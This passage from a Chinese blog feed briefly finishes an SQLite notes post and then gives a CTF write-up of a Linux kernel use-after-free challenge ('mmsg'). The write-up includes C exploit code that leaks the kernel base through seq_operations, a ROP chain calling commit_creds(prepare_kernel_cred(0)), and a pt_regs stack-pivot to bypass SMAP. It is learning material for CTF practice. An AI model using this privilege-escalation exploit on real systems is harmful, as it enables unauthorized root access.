<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.tables  -- 显示表</span><br><span class="line">.schema  -- 表的信息</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">	column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure>

<p>查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 还是SELECT 语句</span><br></pre></td></tr></table></figure>

<h1 id="编程操作"><a href="#编程操作" class="headerlink" title="编程操作"></a>编程操作</h1><p>使用C语言操作数据库，其余编程语言操作数据库也差不多，主要是写SQL语句的操作。</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>peekgeek-mmsg</title>
    <url>/2023/07/28/peekgeek-mmsg/</url>
    <content><![CDATA[<blockquote>
<p>做题踩坑实录，赛后复现.</p>
</blockquote>
<span id="more"></span>

<h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><p>拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>

<p>ext4 镜像挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure>

<p>查看init， etc&#x2F;init.d 下的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>


<p>修改内容，将ko文件拷贝一份，etc&#x2F;init.d&#x2F;rcS内容修改一下，然后umount，启动。（修改效果生效必须要<strong>umount</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure>

<p>内核版本 <code>5.10.186</code></p>
<h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><p>逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>。但是结构体大小0x20</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">    kfree(mmsg_head);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><p>尝试ROP，但是不太会🤡</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>原文内容： <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">「PWN」内核 PWN 题目的第一次尝试</a></p>
<ul>
<li>像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做</li>
<li>调试，找地址，先关闭kaslr，通过泄露获得offset</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  gcc exp.c -static -o exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev_name = <span class="string">&quot;/dev/mmsg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64</span></span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nokalr kernel base</span></span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cat /sys/module/mmsg/sections/.text</span></span><br><span class="line"><span class="comment"> * 0xffffffffc03f5000</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// close kaslr</span></span><br><span class="line"><span class="comment">// grep prepare_kernel_cred  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="comment">// grep commit_creds  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff9248d350</span>;</span><br><span class="line"><span class="comment">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"><span class="comment">//  grep native_write_cr4 /proc/kallsyms</span></span><br><span class="line"><span class="type">size_t</span> native_write_cr4 = <span class="number">0xffffffffa8832250</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ropper</span></span><br><span class="line"><span class="comment">// pop rdi; ret</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff812274dd</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82d63c0d: mov edi, eax; call rbx;</span></span><br><span class="line"><span class="comment">// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零</span></span><br><span class="line"><span class="type">size_t</span> mov_edi_eax_call_rbx = <span class="number">0xffffffff82d63c0d</span>;</span><br><span class="line"><span class="comment">// 0xffffffff82e6f708: pop rbx; ret; </span></span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff82e6f708</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">  <span class="type">int</span> top;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rop</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 之前的都一样</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspace地址被标记为non-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用xchg 进行类似栈迁移的操作，从而进行劫持函数执行流</p>
<p>在本地执行时，直接kernel panic。查看报错信息，发现是<code>can&#39;t access memory in 0x????(是个用户地址)</code>。</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>后来看来一下这篇文章发现原因：<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p>
<ul>
<li>这一题开启了smap，而 pwnhub 的那一题中没有。而smap: kernel space 不能 access user space 的东西。</li>
<li>这篇文章中说了一个 <code>pt_regs</code> 的结构体，在使用syscall 时，会将某些寄存器内容压入<code>内核栈的栈底</code>.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在系统调用的过程中, 不是所有的寄存器都会被改变, 比如 r8 - r15, 他们会在压入 pt_regs 的时保持 syscall 之前的值. 这就为我们提供了布置数据的可能性. 如果在仅能劫持 rip 的情况下 (比如上面介绍的 seq_operations), 跳转到某个形如 <code>add, rsp val; ret</code> 的 gadget, 那么就有可能将 rsp 设置到内核栈的 pt_regs 上, 从而执行我们布置的 ROP 链.</p>
</blockquote>
<p>也就是我们 rop 往 内核栈的 pt_regs 中跳转，就不会绕过了smap</p>
<p>如何将寄存器压入: 使用了巧妙地方法，syscall 调用 read，将寄存器压入，并且可以通过seq_operations-&gt;start执行rop</p>
<p>调用模板+解释的比较详细的文章：<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>gadget: 改变rsp, add rsp, xxx; ret，进行栈迁移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure>


<p>但是我们需要事先知道执行start 时与pt_regs 距离多远。</p>
<p>直接使用没有布局的脚本，自然会kernel panic，可以看到rip的内容，然后与上述的payload进行对比，获得偏移</p>
<p>并且这并不是一个万能的方法</p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>还是不对，因此再看参考文章，如下也存在uaf问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// 遍历查询</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// 双向链表元素内核提供的删除函数</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head 没有，但是固定偏移为 0x10 的地方，相当于free掉list，不会报错</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="偏移确定"><a href="#偏移确定" class="headerlink" title="偏移确定"></a>偏移确定</h4><p>add rsp val，我们需要一个比较具体的值</p>
<p>大概是 <code>0x100+</code> 的gadget吧，不太会，但是此结构体大小大于0x100，并且要开启syscall的栈帧</p>
<ul>
<li>应该可以在ioctl 下断点，但是我失败了😥</li>
</ul>
<h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><ul>
<li>直接看报错:  BUG: unable to handle page fault for address: 0000000044444444 ； RIP: 0010:0x44444444获得我们rip指针控制的寄存器 r14</li>
<li>syscall 不会改变 r8-r15内容。理想情况下r8-r15内容不变，但是可能会产生奇妙的变化。调试，si会走到start指针的操作，从而获得栈结构</li>
<li>假设理想化从r14-r8没有发生改变</li>
<li>si 一路走，但是看不到对应内容?</li>
</ul>
<p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWN状态切换原理及KPTI绕过</a></p>
<p>swapgs; iretq 返回用户态; ret rip,在此处没有使用ret指令，直接iretq, 直接r9为user_rsp就行</p>
